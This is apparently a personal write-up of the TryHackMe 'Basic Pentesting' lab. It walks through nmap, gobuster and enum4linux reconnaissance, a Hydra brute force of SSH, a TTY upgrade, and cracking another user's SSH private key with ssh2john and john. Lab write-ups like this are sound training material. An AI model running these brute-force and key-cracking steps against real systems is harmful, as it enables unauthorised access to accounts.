title: TryHackMe - Basic Pentesting
excerpt: This machine contains multiple remote vulnerabilities and multiple privilege escalation vectors. Your goal is to remotely attack the VM and gain root privileges. Once you’ve finished, try to find other vectors you might have missed! This is a machine that allows you to practise web app hacking and privilege escalation.

# Introduction
-------------
This writeup documents the penetration testing of the [**Basic Pentesting**](https://tryhackme.com/room/basicpentestingjt) machine from TryHackMe.

In this case I'll firstly enumerate as much as I can and then exploit Samba to enumerate users and SSH to access the machine.

# Recon
------------------
## Enumeration of exposed services
----------------

Once we have discovered the IP of the machine we need to enumerate as much information as possible.

When we ping a machine, normally:
* TTL 64: Linux machine
* TTL 128: Windows machine.
We can also use [**whichSystem**](https://github.com/Akronox/WichSystem.py)

```java
❯ ping -c 1 10.10.175.143
PING 10.10.175.143 (10.10.175.143) 56(84) bytes of data.
64 bytes from 10.10.175.143: icmp_seq=1 ttl=63 time=52.6 ms

--- 10.10.175.143 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 52.600/52.600/52.600/0.000 ms
```


In this case, it seems to be a Linux machine. Let's do a port scan with nmap.


```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.175.143 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

```

Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

```java
❯ nmap -sCV -p22,80,139,445,8009,8080 10.10.175.143 -oN targeted

```

nmap found some open ports. The intrussion is probably going to be, or at least start, from port 80.

To figure out the Ubuntu's version codename we need to search in the internet the SSH version followed by '**launchpad**': [https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.13](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.13)

We are facing an **Ubuntu Focal**.


## Web enumeration
------------

We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:

```
❯ whatweb http://10.10.175.143
http://10.10.175.143 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.175.143]
```

![](/assets/images/thm-basic-pentesting/web.png)

```html
<html> 
	<h1>Undergoing maintenance</h1> 
	<h4>Please check back later</h4> 
	<!-- Check our dev note section if you need to know what to work on. --> 
</html>
```

We have nothing interesting on either the website or the source code.

Let's also enumerate the web server running on the port 8080.

```
❯ whatweb http://10.10.175.143:8080
http://10.10.175.143:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.175.143], Title[Apache Tomcat/9.0.7]
```

![](/assets/images/thm-basic-pentesting/web2.png)

This is the Apache Tomcat version 9.0.7 start page. It requests credentials when we click one of the three buttons on the right.


## Fuzzing and file enumeration
----

```java
❯ gobuster dir -u 10.10.175.143 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20

```

Gobuster found the **development** directory and dev.txt may be the *dev note*. Let's take a look in those files. 

![](/assets/images/thm-basic-pentesting/development.png)

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Apache Struts is a free, open-source framework for creating elegant, enterprise-ready Java web applications. It favors convention over configuration, is extensible using a plugin architecture, and ships with plugins to support REST, AJAX, and JSON. 

We also have the version of Struts: *REST version of the example!). Oh, and right now I'm using version 2.5.12*

On the other hand, it seems that J has a weak password in the system, easy to crack. 


## User enumeration
----

SMB is running on the port 139/445 as nmap showed us, so we'll try to enumerate users with the tool **enum4linux**, the output will be quite long but I'll show the most interesting part.

```java
enum4linux -a 10.10.104.79

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
S-1-22-1-1002 Unix User\ubuntu (Local User)
```

# Exploitation
-----------
## Identification and exploitation of vulnerabilities
------------

Let's start with the SSH intrussion, since we have some valid local users in the machine: **kay, jan and ubuntu**. **jan** starts with the letter **J**. If you remember "J" was warned in **J.txt** because he had a weak and easy to crack password. I'll try to crack jan's password with **Hydra**.

```bash
❯ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.175.143 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-29 20:10:14

```

We got the credentials. Now we have access to the server via SSH.

### tty treatment
-----------
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 185
```

# Post-Exploitation
----------

We need to find a way to escalate privileges. To find ways in Linux I normally use **linpeas.sh** 

```bash
❯ scp linpeas.sh jan@10.10.175.143:/tmp/
```

The output is quite long, but it reports the location of the ssh keys of kay.

```
jan@ip-10-10-175-143:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied
jan@ip-10-10-175-143:/home/kay$ ls -l pass.bak
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak
jan@ip-10-10-175-143:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

In the home directory of kay we found an interesting pass.bak file, but we can't open the file. 

We need to access as kkay. I'll copy the content of the private SSH key file id_rsa and paste it in my machine. I'll use  **ssh2john** and then, **john**.

```
❯ ssh2john id_rsa > pass.hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

Cost 2 (iteration count) is 1 for all loaded hashes

Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have another credential. To log in as kay we can put our public SSH key in the victim's machine or execute ssh -i to use kay's private SSH key and his password.

```bash
ssh -i /home/kay/.ssh/id_rsa kay@10.10.175.143
```

Now we can see the content of pass.bak.

Happy hacking for you too, Josiah! Enumeration is key. I'll send you the link of this writeup ;)
